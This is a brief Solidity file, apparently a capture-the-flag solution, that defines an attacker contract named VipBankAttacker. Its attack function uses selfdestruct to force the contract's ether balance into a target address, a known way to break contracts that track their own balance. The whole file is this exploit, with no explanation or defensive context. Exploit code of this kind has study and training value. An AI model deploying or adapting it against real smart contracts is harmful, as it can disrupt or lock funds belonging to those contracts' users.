// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

contract VipBankAttacker {
    function attack(address _addr) external {
        selfdestruct(payable(_addr));
    }

    receive() external payable {}
}
